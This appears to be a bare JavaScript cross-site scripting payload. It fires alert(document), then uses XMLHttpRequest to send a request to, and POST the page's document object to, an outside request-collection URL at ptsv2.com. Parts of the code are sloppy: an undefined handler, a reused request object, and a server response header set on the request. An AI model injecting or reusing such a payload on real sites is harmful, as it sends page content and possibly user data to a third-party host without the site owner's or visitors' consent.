
alert(document);
const xhr = new XMLHttpRequest();
const url = 'https://ptsv2.com/t/fyrw2-1641653611/post';

xhr.open('GET', url);
xhr.onreadystatechange = someHandler;
xhr.send();

xhr.open("POST", 'https://ptsv2.com/t/fyrw2-1641653611/post', true);
xhr.setRequestHeader('Access-Control-Allow-Origin', 'https://ptsv2.com');
xhr.send(document);
